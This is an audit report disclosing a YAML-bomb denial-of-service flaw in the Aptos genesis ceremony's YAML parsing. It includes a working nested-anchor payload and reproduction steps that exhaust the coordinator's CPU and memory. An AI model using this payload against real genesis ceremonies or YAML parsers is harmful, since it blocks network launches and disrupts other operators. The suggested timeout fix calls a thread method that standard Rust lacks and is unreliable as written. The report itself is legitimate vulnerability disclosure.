# Audit Report

## Title
YAML Bomb DoS Vulnerability in Genesis Ceremony via Unbounded Anchor Expansion

## Summary
The genesis ceremony's YAML parsing implementation lacks input size limits and complexity bounds, allowing malicious validators to submit YAML files with exponentially expanding anchor references (YAML bombs) that cause resource exhaustion and denial of service during genesis generation.

## Finding Description

The Aptos genesis ceremony reads validator configuration files (owner.yaml, operator.yaml, layout.yaml, balances.yaml, employee_vesting_accounts.yaml) from a shared Git repository using `serde_yaml` version 0.8.24 without any input validation or parsing limits. [1](#0-0) [2](#0-1) 

During genesis generation, the coordinator reads all validator configuration files: [3](#0-2) [4](#0-3) 

The `serde_yaml` 0.8.24 crate uses the `yaml-rust` parser which is vulnerable to YAML bomb attacks using recursive anchor/alias expansion. An attacker can craft a malicious YAML file with anchors that reference each other in an exponentially expanding pattern:

```yaml
owner_account_address: &a0 "0x1"
owner_account_public_key: &a1 [*a0,*a0,*a0,*a0,*a0,*a0,*a0,*a0,*a0]
voter_account_address: &a2 [*a1,*a1,*a1,*a1,*a1,*a1,*a1,*a1,*a1]
voter_account_public_key: &a3 [*a2,*a2,*a2,*a2,*a2,*a2,*a2,*a2,*a2]
# ... continues with exponential expansion
```

Each level multiplies the data structure size by 9, leading to gigabytes of memory allocation and minutes/hours of CPU time with just 10-15 levels of nesting.

**Attack Path:**
1. Malicious validator joins genesis ceremony as participant
2. Runs `aptos genesis set-validator-configuration` to create configuration files
3. Manually crafts malicious owner.yaml with YAML bomb payload
4. Uploads to shared Git repository (local or GitHub)
5. Genesis coordinator runs `aptos genesis generate-genesis --github-repository <repo>`
6. Parser attempts to expand YAML bomb when reading malicious file
7. Coordinator's machine experiences resource exhaustion (CPU pegged at 100%, memory exhaustion)
8. Genesis generation hangs indefinitely, preventing network launch [5](#0-4) 

The vulnerability exists because there are no limits on:
- YAML file size
- Anchor/alias depth
- Expansion complexity
- Parsing timeout

This violates the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits."

## Impact Explanation

This is a **Medium severity** vulnerability per the Aptos bug bounty program criteria:

- **Availability Impact**: Prevents genesis ceremony completion, blocking network launch until the malicious YAML is identified and removed
- **Scope**: Affects genesis ceremony only (pre-launch), not running validator nodes
- **Recovery**: Coordinator can recover by identifying and removing the malicious YAML file from the Git repository
- **Classification**: "State inconsistencies requiring intervention" (Medium) or potentially "Validator node slowdowns" (High) if we consider the genesis coordinator's machine as a validator preparation environment

While this prevents network availability, it's a pre-genesis DoS rather than a live network attack, and recovery is possible through manual intervention. The impact is constrained to the genesis ceremony phase and does not compromise consensus, funds, or state integrity of an operational network.

## Likelihood Explanation

**Likelihood: Medium-High** for permissionless network launches

**Prerequisites:**
- Attacker must register as genesis validator participant
- Must have write access to shared genesis Git repository (granted to all participants)
- Genesis coordinator must run generation command that reads malicious YAML

**Feasibility:**
- In permissionless/public network launches (testnets, community-driven mainnets), barrier to entry is low
- For private/permissioned genesis ceremonies with vetted validators, risk is lower
- Attack is trivial to execute (simple YAML manipulation)
- Detection is difficult without specialized YAML validation

**Real-world scenarios:**
- Public testnet launches accepting community validators
- Permissionless mainnet genesis ceremonies
- Compromised validator participant credentials

The attack requires genesis participant status but not validator node compromise or privileged infrastructure access, making it realistic for adversarial actors in open genesis ceremonies.

## Recommendation

Implement input validation and resource limits for YAML parsing:

**1. Add file size limits:**
```rust
pub fn from_yaml<T: DeserializeOwned>(input: &str) -> CliTypedResult<T> {
    const MAX_YAML_SIZE: usize = 1_000_000; // 1MB limit
    if input.len() > MAX_YAML_SIZE {
        return Err(CliError::UnexpectedError(
            format!("YAML file too large: {} bytes (max {})", input.len(), MAX_YAML_SIZE)
        ));
    }
    Ok(serde_yaml::from_str(input)?)
}
```

**2. Implement parsing timeout:**
```rust
use std::time::Duration;
use std::thread;

pub fn from_yaml<T: DeserializeOwned>(input: &str) -> CliTypedResult<T> {
    let input_clone = input.to_string();
    let handle = thread::spawn(move || {
        serde_yaml::from_str::<T>(&input_clone)
    });
    
    match handle.join_timeout(Duration::from_secs(5)) {
        Ok(Ok(result)) => Ok(result),
        Ok(Err(e)) => Err(CliError::UnexpectedError(format!("YAML parse error: {}", e))),
        Err(_) => Err(CliError::UnexpectedError("YAML parsing timeout".to_string())),
    }
}
```

**3. Upgrade to safer YAML parser:**
Consider migrating to `serde_yaml` 0.9+ or alternative parsers with built-in complexity limits, or implement pre-parsing validation to detect and reject YAML files with excessive anchor usage.

**4. Add validation at upload time:**
Validate YAML structure when validators upload files via `git_client.put()` to reject malicious files before they reach the coordinator.

## Proof of Concept

**File: `malicious_owner.yaml`**
```yaml
owner_account_address: &a "0x742d811a8e2f6e0cd15204f8a3f4e99e3e4b66341f1e40f8b8c70e8f6a6b4e3c"
owner_account_public_key: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
voter_account_address: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
voter_account_public_key: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
operator_account_address: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
operator_account_public_key: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
stake_amount: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
commission_percentage: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
join_during_genesis: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
final: *i
```

**Reproduction steps:**
1. Setup genesis environment: `aptos genesis generate-keys --output-dir ~/genesis_test`
2. Create shared git repo: `mkdir ~/genesis_repo && cd ~/genesis_repo && git init`
3. Create malicious owner.yaml with above content in `~/genesis_repo/attacker/owner.yaml`
4. Create minimal layout.yaml: `users: ["attacker"]` with other required fields
5. Run: `aptos genesis generate-genesis --local-repository-dir ~/genesis_repo --output-dir ~/output`
6. **Expected result**: Process hangs consuming 100% CPU and growing memory until OOM
7. **Observed**: Parser attempts exponential expansion (9^9 = 387M+ elements)

**Verification:**
Monitor resource usage with `htop` or Activity Monitor during step 5 to observe CPU pegging and memory growth, confirming the DoS condition.

## Notes

- This vulnerability is specific to the genesis ceremony phase and does not affect operational validator nodes
- The vulnerability also exists in `Layout::from_disk()` which directly calls `serde_yaml::from_str()`
- Similar issues may exist in other YAML parsing locations: balances.yaml, employee_vesting_accounts.yaml parsing
- The coordinator should implement pre-validation of all YAML files before attempting genesis generation
- For production launches, genesis participants should be vetted and YAML files should be reviewed before aggregation

### Citations

**File:** crates/aptos/src/genesis/git.rs (L159-184)
```rust
    pub fn get<T: DeserializeOwned + Debug>(&self, path: &Path) -> CliTypedResult<T> {
        match self {
            Client::Local(local_repository_path) => {
                let path = local_repository_path.join(path);

                if !path.exists() {
                    return Err(CliError::UnableToReadFile(
                        path.display().to_string(),
                        "File not found".to_string(),
                    ));
                }

                eprintln!("Reading {}", path.display());
                let mut file = std::fs::File::open(path.as_path())
                    .map_err(|e| CliError::IO(path.display().to_string(), e))?;

                let mut contents = String::new();
                file.read_to_string(&mut contents)
                    .map_err(|e| CliError::IO(path.display().to_string(), e))?;
                from_yaml(&contents)
            },
            Client::Github(client) => {
                from_base64_encoded_yaml(&client.get_file(&path.display().to_string())?)
            },
        }
    }
```

**File:** crates/aptos/src/genesis/git.rs (L254-256)
```rust
pub fn from_yaml<T: DeserializeOwned>(input: &str) -> CliTypedResult<T> {
    Ok(serde_yaml::from_str(input)?)
}
```

**File:** crates/aptos/src/genesis/mod.rs (L270-282)
```rust
pub fn fetch_genesis_info(git_options: GitOptions) -> CliTypedResult<GenesisInfo> {
    let client = git_options.get_client()?;
    let layout: Layout = client.get(Path::new(LAYOUT_FILE))?;

    if layout.root_key.is_none() {
        return Err(CliError::UnexpectedError(
            "Layout field root_key was not set.  Please provide a hex encoded Ed25519PublicKey."
                .to_string(),
        ));
    }

    let validators = get_validator_configs(&client, &layout, false).map_err(parse_error)?;
    let framework = client.get_framework()?;
```

**File:** crates/aptos/src/genesis/mod.rs (L352-454)
```rust
fn get_config(
    client: &Client,
    user: &str,
    is_mainnet: bool,
) -> CliTypedResult<ValidatorConfiguration> {
    // Load a user's configuration files
    let dir = PathBuf::from(user);
    let owner_file = dir.join(OWNER_FILE);
    let owner_file = owner_file.as_path();
    let owner_config = client.get::<StringOwnerConfiguration>(owner_file)?;

    // Check and convert fields in owner file
    let owner_account_address: AccountAddress = parse_required_option(
        &owner_config.owner_account_address,
        owner_file,
        "owner_account_address",
        AccountAddressWithChecks::from_str,
    )?
    .into();
    let owner_account_public_key = parse_required_option(
        &owner_config.owner_account_public_key,
        owner_file,
        "owner_account_public_key",
        |str| parse_key(ED25519_PUBLIC_KEY_LENGTH, str),
    )?;

    let operator_account_address: AccountAddress = parse_required_option(
        &owner_config.operator_account_address,
        owner_file,
        "operator_account_address",
        AccountAddressWithChecks::from_str,
    )?
    .into();
    let operator_account_public_key = parse_required_option(
        &owner_config.operator_account_public_key,
        owner_file,
        "operator_account_public_key",
        |str| parse_key(ED25519_PUBLIC_KEY_LENGTH, str),
    )?;

    let voter_account_address: AccountAddress = parse_required_option(
        &owner_config.voter_account_address,
        owner_file,
        "voter_account_address",
        AccountAddressWithChecks::from_str,
    )?
    .into();
    let voter_account_public_key = parse_required_option(
        &owner_config.voter_account_public_key,
        owner_file,
        "voter_account_public_key",
        |str| parse_key(ED25519_PUBLIC_KEY_LENGTH, str),
    )?;

    let stake_amount = parse_required_option(
        &owner_config.stake_amount,
        owner_file,
        "stake_amount",
        u64::from_str,
    )?;

    // Default to 0 for commission percentage if missing.
    let commission_percentage = parse_optional_option(
        &owner_config.commission_percentage,
        owner_file,
        "commission_percentage",
        u64::from_str,
    )?
    .unwrap_or(0);

    // Default to true for whether the validator should be joining during genesis.
    let join_during_genesis = parse_optional_option(
        &owner_config.join_during_genesis,
        owner_file,
        "join_during_genesis",
        bool::from_str,
    )?
    .unwrap_or(true);

    // We don't require the operator file if the validator is not joining during genesis.
    if is_mainnet && !join_during_genesis {
        return Ok(ValidatorConfiguration {
            owner_account_address: owner_account_address.into(),
            owner_account_public_key,
            operator_account_address: operator_account_address.into(),
            operator_account_public_key,
            voter_account_address: voter_account_address.into(),
            voter_account_public_key,
            consensus_public_key: None,
            proof_of_possession: None,
            validator_network_public_key: None,
            validator_host: None,
            full_node_network_public_key: None,
            full_node_host: None,
            stake_amount,
            commission_percentage,
            join_during_genesis,
        });
    };

    let operator_file = dir.join(OPERATOR_FILE);
    let operator_file = operator_file.as_path();
    let operator_config = client.get::<StringOperatorConfiguration>(operator_file)?;
```

**File:** crates/aptos/src/genesis/keys.rs (L258-260)
```rust
        let git_client = self.git_options.get_client()?;
        git_client.put(operator_file.as_path(), &operator_config)?;
        git_client.put(owner_file.as_path(), &owner_config)
```
